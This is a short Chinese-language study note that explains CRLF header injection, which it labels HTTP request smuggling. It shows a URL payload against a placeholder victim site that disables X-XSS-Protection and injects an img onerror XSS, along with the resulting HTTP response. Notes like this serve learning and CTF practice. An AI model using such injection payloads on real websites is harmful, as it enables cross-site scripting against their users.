# HRS
HRS(HTTP Request Smuggling)跟CRLF息息相關。注意CRLF可不是CSRF，CRLF正式window中換行的符號(carriage return + line feed)，也就是`\r(%0d)`+`\n(%0a)`，在Unix系統中只有`\n`代表換行，這也是為何Unix的文件拿到window系統中常常變成一行。現在回到攻擊手法，HTTP Header和HTTP Body會用兩個CRLF分隔，注入一些惡意的換行就可以掌握很多東西...  

### XSS
HRS下，XSS甚至可以繞過瀏覽器的filter，這裡就舉chrome的xss-auditor為例，標頭中有`X-XSS-Protection`，需要設為0才能成功反射型XSS。假設有一個存在header注入漏洞的網站`www.victim.com`，我們可以透過注入URL來決定要跳轉到哪裡，也就是控制`Location`的標頭...  
```php
http://www.victim.com/?url=%0d%0aX-XSS-Protection=0%0d%0a%0d%0a<img src=1 onerror=alert(/xss/)>

// response
HTTP/1.1 302 Moved Temporarily 
Date: Mon, 9 Jul 2018 16:55:17 GMT 
Content-Type: text/html 
Content-Length: 154 
Connection: close 
Location:
X-XSS-Protection=0
<img src=1 onerror=alert(/xss/)>
```  
`<img src=1 onerror=alert(/xss/)>`已被視為Body，而且XSS-Auditor的保護是關著的...  

### Reference
1. [Codegate CTF Preliminary 2014 200 Web Proxy](https://ddaa.tw/codegate_web_200_web_proxy.html)  
2. [HTTP请求头信息的注入](https://wps2015.org/2014/09/10/sql-injection-in-http-headers/)